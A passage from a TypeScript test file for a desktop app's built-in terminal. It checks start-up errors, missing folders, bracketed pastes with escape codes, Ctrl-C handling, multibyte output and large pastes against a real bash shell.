      if (job) try { process.kill(job, 'SIGKILL'); } catch { /* gone */ }
    }
  });
});

// T3 Code's terminal tests and fixes, held to Oby's own contract (docs/contracts/terminal.md)
describe('T3: the terminal', () => {
  // T3 e101cae1b9, Manager.test "keeps a startup failure in the snapshot": a shell that can't start says why
  it('t3_terminal_a_shell_that_cant_start_says_why_and_nothing_runs', async () => {
    const dir = worktree('j1');
    const failing = new Terminals(() => () => { throw new Error('posix_spawnp failed.'); }, (p, ...a) => (p as unknown as Page | null)?.send(...(a as Sent)), () => ENV);
    const p = page();
    expect(failing.start(p as never, 'task', 'j1', dir, 80, 24)).toEqual({ error: 'The shell didn’t start: posix_spawnp failed.' });
    expect(failing.open).toBe(0);
    expect(p.sent).toEqual([]);
  });

  // T3 8a227eba4e: a project folder gone since it was listed gives words, not a crash
  it('t3_terminal_a_folder_gone_since_says_so_and_starts_nothing', () => {
    const gone = mkdtempSync(join(tmpdir(), 'oby-term-gone-'));
    rmSync(gone, { recursive: true });
    expect(terms.start(page() as never, 'task', 'j1', gone, 80, 24)).toEqual({ error: 'Its folder isn’t on this Mac any more.' });
    expect(spawned).toHaveLength(0);
  });

  // TERMINAL-2: "a conversation's starts in its first folder as obid lists it"; a folder gone since says so
  it('t3_terminal_a_conversation_whose_first_folder_went_never_opens_in_its_second', async () => {
    const gone = mkdtempSync(join(tmpdir(), 'oby-term-first-'));
    rmSync(gone, { recursive: true });
    const b = realpathSync(mkdtempSync(join(tmpdir(), 'oby-term-second-')));
    the.state.conversations = [{ id: 'c1', folders: [gone, b] }];
    input();
    const a = await open(page(), 'conversation', 'c1');
    expect(a.cwd).toBeUndefined();
    expect(spawned.map((s) => s.opts.cwd)).not.toContain(b);
  });

  // T3 fe949fe1bc (threads with long ids): obid's own ids, a 36-character UUID, open a shell
  it('t3_terminal_a_conversation_with_obids_own_uuid_id_opens_its_shell', async () => {
    const dir = realpathSync(mkdtempSync(join(tmpdir(), 'oby-term-uuid-')));
    const uuid = '0f8e2b7c-3a41-4d0e-9b5f-6c2d1e8a9b70';
    the.state.conversations = [{ id: uuid, folders: [dir] }];
    input();
    expect((await open(page(), 'conversation', uuid)).cwd).toBe(dir);
    expect(spawned.map((s) => s.opts.cwd)).toEqual([dir]);
  });

  // NodePtyAdapter.test "replays an exit to late subscribers and respects unsubscription"; TERMINAL-4: nothing comes after its close
  it('t3_terminal_nothing_at_all_comes_after_a_close_not_even_its_exit', async () => {
    worktree('j1');
    const p = page();
    input();
    const { term } = await open(p, 'task', 'j1');
    spawned[0].data!('late');
    the.handlers.get('terminal-close')!({ sender: p }, term);
    await flush();
    expect(p.sent.filter((s) => s[1] === term)).toEqual([]);
  });

  // a paste with control sequences in it (a coloured log line): exactly the clipboard's text, as xterm.js 6.0.0 brackets it
  it('t3_terminal_a_bracketed_paste_holding_an_escape_reaches_the_shell_as_copied', async () => {
    worktree('j1');
    input();
    const { term } = await open(page(), 'task', 'j1');
    the.clip = 'a\x1b[31mred\x1b[0m\nb';
    key('v', { meta: true });
    write(term!, '\x1b[200~a\x1b[31mred\x1b[0m\rb\x1b[201~');
    await flush();
    expect(spawned[0].written).toEqual(['\x1b[200~a\x1b[31mred\x1b[0m\rb\x1b[201~']);
  });
});

describe('T3: a real shell', () => {
  const bash = '/bin/bash';
  const real = () => {
    const out: string[] = [];
    const t = new Terminals(nodePty, (_p, channel, _id, data) => { if (channel === 'terminal-data') out.push(data as string); }, () => {
      const who = userInfo();
      return { shell: bash, env: cleanEnv(process.env, { home: who.homedir, user: who.username, shell: bash }, '1.2.3') };
    }, 300);
    return { t, text: () => out.join('') };
  };
  const until = async (f: () => boolean, ms = 10_000) => { const end = Date.now() + ms; while (!f()) { if (Date.now() > end) throw new Error('timed out'); await new Promise((r) => setTimeout(r, 20)); } };
  const started = (t: InstanceType<typeof Terminals>, dir: string) => { const o = t.start(null, 'task', 'j1', dir, 80, 24); expect('term' in o).toBe(true); return (o as { term: string }).term; };

  // T3's e2e scenarios, real-Mac step 2 (⌃C): the key's byte stops what runs in the foreground, and the shell goes on
  it('t3_terminal_ctrl_c_stops_the_running_program_and_the_shell_goes_on', async () => {
    const dir = realpathSync(mkdtempSync(join(tmpdir(), 'oby-term-int-')));
    const { t, text } = real();
    const term = started(t, dir);
    // `&&`, not `;`: macOS's bash 3.2 runs the rest of a `;` list after its foreground job dies of SIGINT
    t.write(term, 'sleep 30 && echo SL""EPT\r');
    await new Promise((r) => setTimeout(r, 300));
    t.write(term, '\x03');
    t.write(term, 'echo AF""TER\r');
    await until(() => /AFTER/.test(text()), 5000);
    expect(text()).not.toContain('SLEPT');
    t.close(term);
    t.killLeft();
  });

  // T3 Manager.test "joins surrogate pairs across chunk boundaries": 4-byte characters split between reads arrive whole
  it('t3_terminal_four_byte_characters_split_between_reads_arrive_whole', async () => {
    const dir = realpathSync(mkdtempSync(join(tmpdir(), 'oby-term-emoji-')));
    const { t, text } = real();
    const term = started(t, dir);
    t.write(term, 'printf "\\360\\237\\230\\200%.0s" $(seq 1 2000); printf "\\nEN""D\\n"\r');
    await until(() => /\r\nEND\r\n/.test(text()));
    expect(text()).toContain('😀'.repeat(2000));
    expect(text()).not.toContain('�');
    t.close(term);
    t.killLeft();
  });

  // T3 8dba23e420, e2e terminal-large-paste-reaches-program: a large paste reaches the program byte for byte
  it('t3_terminal_a_large_paste_reaches_the_program_byte_for_byte', async () => {
    const dir = realpathSync(mkdtempSync(join(tmpdir(), 'oby-term-paste-')));
    const line = 'const answer = 42; // é ü 日本 😀 tab\there\r';
    const paste = line.repeat(Math.ceil(300_000 / line.length));
    const want = Buffer.from(paste);
    const { t, text } = real();
    const term = started(t, dir);
    // pasted once the terminal is raw (READY comes after `stty raw`), never after a guessed time: on a
    // busy machine the shell may not have gone raw yet, and the paste would be cooked or read by bash
    // (#2769); bytes in before `head` reads wait in the raw terminal's queue
    t.write(term, `stty raw -echo; printf RE""ADY; head -c ${want.length} > got.bin; stty sane; echo GO""T\r`);
    await until(() => /READY/.test(text()));
    t.write(term, paste);
    await until(() => /GOT/.test(text()), 20_000);
    const { readFileSync } = await import('node:fs');
    expect(readFileSync(join(dir, 'got.bin')).equals(want)).toBe(true);
    t.close(term);
    t.killLeft();
  });
});
